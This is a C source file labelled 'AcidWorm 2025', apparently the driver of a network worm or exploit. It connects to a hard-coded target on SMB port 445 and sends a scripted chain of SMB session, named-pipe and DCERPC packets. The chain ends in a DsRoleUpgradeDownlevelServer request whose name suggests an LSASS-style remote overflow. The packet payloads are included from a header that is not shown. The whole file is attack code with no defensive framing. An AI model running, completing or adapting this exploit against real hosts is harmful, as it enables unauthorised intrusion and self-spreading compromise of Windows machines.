#include <WS2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

#include "requests.h"

void SendPacket(int socket, char* buffer, size_t bufferLen);


int main()
{

	printf("[*] AcidWorm 2025\r\n");
    
	
	const char* localIP = "192.168.1.2";
	int localPort = 242;
	
	const char* targetIP = "192.168.1.1";
	int targetPort = 445;

	unsigned char recvBuff[500] = { 0 };

	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[*] WSAStartup failed. \r\n");
		return 0;
	}

	int sock = socket(AF_INET, SOCK_STREAM, 0);

	int timeout = 5000; // milliseconds
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	
	struct sockaddr_in targetAddress;
	targetAddress.sin_family = AF_INET;
	targetAddress.sin_port = htons(targetPort);
	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);


	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
	{
		printf("[*] connect failed. targetIP: %s, port: %i\r\n error: %i", targetIP, targetPort, WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}


	SendPacket(sock, (char*)SMB_NEGOTIATE_REQUEST_PACKET, sizeof(SMB_NEGOTIATE_REQUEST_PACKET));
	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_1_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_1_PACKET));
	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_2_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_2_PACKET));
	SendPacket(sock, (char*)SMB_CONNECT_ANDX_REQUEST_PACKET, sizeof(SMB_CONNECT_ANDX_REQUEST_PACKET));
	SendPacket(sock, (char*)SMB_NT_CREATE_ANDX_REQUEST_PACKET, sizeof(SMB_NT_CREATE_ANDX_REQUEST_PACKET));
	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_INVISIBLE_MESSAGEBOX, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_INVISIBLE_MESSAGEBOX));



	closesocket(sock);
	WSACleanup();
	return 1;
}



void SendPacket(int socket, char* buffer, size_t bufferLen)
{

	int bytesSent = 0;
	int bytesRecieved = 0;
	unsigned char recvBuff[1500] = { 0 };

	bytesSent = send(socket, buffer, bufferLen, 0);
	if (bytesSent <= 0)
	{
		printf("[*] send failed.\r\n");
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(socket);
		WSACleanup();
		return;


	}
	printf("[*] sent %i bytes\r\n", bytesSent);

	bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
	if (bytesRecieved <= 0)
	{
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(socket);
		WSACleanup();
		return;
	}

	printf("[*] recieved %i bytes\r\n", bytesRecieved);

}